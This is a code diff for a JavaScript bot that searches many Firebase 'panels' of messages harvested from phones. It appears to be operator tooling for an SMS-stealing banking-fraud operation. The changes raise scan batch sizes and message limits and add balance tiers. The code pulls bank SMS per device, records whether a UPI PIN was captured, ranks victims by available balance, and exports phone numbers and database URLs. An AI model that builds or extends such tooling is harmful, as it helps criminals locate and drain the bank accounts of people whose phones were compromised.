@@ -1,4 +1,4 @@
-import { fetchAllPanels, firebaseGet } from './panelCore.mjs';
+import { fetchAllPanels, normalizeFirebaseUrl } from './panelCore.mjs';
 import { processBankMessages } from './bankSms.mjs';
 
 const TIERS = {
@@ -7,6 +7,8 @@ const TIERS = {
   bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
   user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
 };
+
+const SMS_LIMIT = { 1: 700, 3: 1000, 7: 1400, 15: 2000, 30: 2500, 0: 3000 };
 
 export function parseSearchCommand(text) {
   const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
@@ -41,19 +43,13 @@ export function parseSearchCommand(text) {
       opts.online = false;
       opts.offline = false;
     } else if (/^\d+\s*d(ays?)?$/.test(p) || /^last\s*\d+/.test(p)) {
-      const n = parseInt(p.match(/\d+/)?.[0] || '1', 10);
-      opts.days = n;
+      opts.days = parseInt(p.match(/\d+/)?.[0] || '1', 10);
     } else if (p === 'high' || p === 'high-low') opts.tier = 'high_low';
     else if (p === 'low' || p === 'low-high') opts.tier = 'low_high';
+    else if (p === '30k' || p === '30-90l') opts.tier = 'user30_90L';
     else if (/avl|bal/.test(p)) opts.avlBal = true;
     else if (p === 'bank' || p === 'bank online') opts.bankOnly = true;
-    else if (p.includes('pin') && p.includes('no')) opts.pinBoth = true;
     else opts.keywords.push(p);
-  }
-
-  if (opts.bothStatus) {
-    opts.online = false;
-    opts.offline = false;
   }
 
   return opts;
@@ -73,18 +69,38 @@ function devicePassesPin(d, opts) {
   return true;
 }
 
-function amountInTier(device, tier) {
-  const amt = device.maxBalance || device.maxTxn || 0;
-  return amt >= tier.min && amt <= tier.max;
+async function fetchDeviceMessages(device, limit = 800) {
+  const base = normalizeFirebaseUrl(device.panelUrl);
+  const params = new URLSearchParams({
+    orderBy: '"$key"',
+    limitToLast: String(limit),
+  });
+  if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), 9000);
+  try {
+    const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
+      signal: ctrl.signal,
+      headers: { Accept: 'application/json' },
+    });
+    clearTimeout(timer);
+    if (!res.ok) return null;
+    const data = await res.json();
+    if (data?.error) return null;
+    return data;
+  } catch {
+    clearTimeout(timer);
+    return null;
+  }
 }
 
-async function fetchDeviceMessages(device, limit = 2000) {
-  const extra = { orderBy: '"$key"', limitToLast: String(limit) };
-  const params = new URLSearchParams({ auth: device.panelKey.trim(), ...extra });
-  const url = `${device.panelUrl.replace(/\/$/, '')}/messages/${device.id}.json?${params}`;
-  const res = await fetch(url, { headers: { Accept: 'application/json' } });
-  if (!res.ok) return null;
-  return res.json();
+function smsLimitForDays(days) {
+  if (days <= 1) return SMS_LIMIT[1];
+  if (days <= 3) return SMS_LIMIT[3];
+  if (days <= 7) return SMS_LIMIT[7];
+  if (days <= 15) return SMS_LIMIT[15];
+  if (days <= 30) return SMS_LIMIT[30];
+  return SMS_LIMIT[0];
 }
 
 export function buildSearchHeader(opts, tier) {
@@ -97,23 +113,32 @@ export function buildSearchHeader(opts, tier) {
   return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- LAST ${opts.days} DAY(S)`;
 }
 
-export function buildExportText(results, opts, tier, panelsTotal, elapsedMs) {
+export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, elapsedMs) {
   const smsTotal = results.reduce((s, r) => s + (r.bankSms?.length || 0), 0);
+  const gen = new Date().toLocaleString('en-IN', { hour12: false }).replace(',', '');
   const lines = [
     buildSearchHeader(opts, tier),
-    new Date().toLocaleString('en-IN', { hour12: false }).replace(',', ''),
-    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${panelsTotal}/${panelsTotal} | ${(elapsedMs / 1000).toFixed(0)}s`,
+    `Generated: ${gen}`,
+    `Search time: ${(elapsedMs / 1000).toFixed(0)}s`,
+    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${dbPanelsHit}/${panelsTotal}`,
     '',
   ];
 
   results.forEach((d, i) => {
+    const smsList = d.bankSms || [];
     lines.push(`----------------+#[${i + 1}]-----------------`);
+    lines.push(`Firebase: ${normalizeFirebaseUrl(d.panelUrl)}`);
     lines.push(`Device ID: ${d.id}`);
+    lines.push(`Phone: ${d.phone || '—'}`);
     lines.push(`UPI PIN: ${d.hasPin ? 'YES' : 'NO'}`);
-    if (d.maxBalance) lines.push(`Peak Avl Bal: Rs ${d.maxBalance.toLocaleString('en-IN')}`);
-    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | Panel: ${d.panelName || '—'}`);
-    (d.bankSms || []).forEach((m, j) => {
-      lines.push(`  ${j + 1}. [${m.sender}] ${m.text}`);
+    if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
+    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
+    lines.push(`Panel: ${d.panelName || '—'}`);
+  lines.push('');
+    smsList.forEach(m => {
+      lines.push('---------------------------------------------------');
+      lines.push(`[${m.sender}]`);
+      lines.push(m.text);
     });
     lines.push('');
   });
@@ -123,16 +148,21 @@ export function buildExportText(results, opts, tier, panelsTotal, elapsedMs) {
 export async function runSearch(panels, opts, onProgress) {
   const tier = TIERS[opts.tier] || TIERS.low_high;
   const t0 = Date.now();
+  const panelsHit = new Set();
+
   let devices = await fetchAllPanels(panels, {
-    batch: 15,
+    batch: 35,
     onProgress: (done, total, count) => {
       onProgress?.({ phase: 'panels', done, total, count });
     },
   });
 
+  devices.forEach(d => panelsHit.add(d.panelUrl?.toLowerCase()));
+
   devices = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
   const results = [];
-  const batch = 12;
+  const batch = 28;
+  const limit = smsLimitForDays(opts.days);
   let scanned = 0;
 
   for (let i = 0; i < devices.length; i += batch) {
@@ -140,16 +170,14 @@ export async function runSearch(panels, opts, onProgress) {
     await Promise.all(
       chunk.map(async d => {
         try {
-          const data = await fetchDeviceMessages(d, opts.days <= 1 ? 1200 : 2500);
+          const data = await fetchDeviceMessages(d, limit);
           const r = processBankMessages(data, opts.days);
-          if (!r.bankSmsCount && !r.maxBalance) return;
+          if (!r.bankSmsCount) return;
           if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
           const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
           const amt = row.maxBalance || row.maxTxn || 0;
-          const inTier = amt >= tier.min && amt <= tier.max;
-          if (inTier || (r.bankSmsCount > 0 && opts.bankOnly && amt === 0)) {
-            if (inTier || r.bankSmsCount > 0) results.push(row);
-          }
+          if (opts.tier !== 'low_high' && amt > 0 && (amt < tier.min || amt > tier.max)) return;
+          results.push(row);
         } catch (_) {}
       })
     );
@@ -157,18 +185,21 @@ export async function runSearch(panels, opts, onProgress) {
     onProgress?.({ phase: 'sms', done: scanned, total: devices.length, matched: results.length });
   }
 
-  results.sort((a, b) => {
+  const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
+  filtered.sort((a, b) => {
     const aa = a.maxBalance || a.maxTxn || 0;
     const ab = b.maxBalance || b.maxTxn || 0;
     return tier.sort === 'asc' ? aa - ab : ab - aa;
   });
 
-  const text = buildExportText(results, opts, tier, panels.length, Date.now() - t0);
+  const elapsed = Date.now() - t0;
+  const text = buildExportText(filtered, opts, tier, panels.length, panelsHit.size, elapsed);
+  const sms = filtered.reduce((s, r) => s + r.bankSms.length, 0);
   return {
-    results,
+    results: filtered,
     text,
-    stats: { devices: results.length, sms: results.reduce((s, r) => s + r.bankSms.length, 0) },
-    elapsed: Date.now() - t0,
+    stats: { devices: filtered.length, sms, panelsHit: panelsHit.size },
+    elapsed,
     tier,
     opts,
   };
@@ -180,15 +211,10 @@ export function searchHelpText() {
     'Quick:\n' +
     '`/search avl/bal, bank online`\n\n' +
     '🏦 High balance:\n' +
-    '`/searchbank` ya `/searchbank bank online`\n\n' +
-    'Flow:\n' +
-    '`/search` → keywords → online/offline/both → days → Start\n\n' +
-    '• `online` = live devices\n' +
-    '• `offline` = dead\n' +
-    '• `both` = dono\n' +
-    '• `1d` `7d` = last N days\n' +
-    '• `low` = 2K–50K | `high` = 50K–90L\n\n' +
-    'Pehle file + caption `addtxt` se Firebase add karo.\n' +
-    '/done = running search cancel'
+    '`/searchbank` ya `30-90L, high`\n\n' +
+    '📩 File + caption `addtxt` ya `/fb`\n\n' +
+    '• spam SMS auto remove\n' +
+    '• TXT mein full Firebase + Device ID\n' +
+    '/done = cancel'
   );
 }
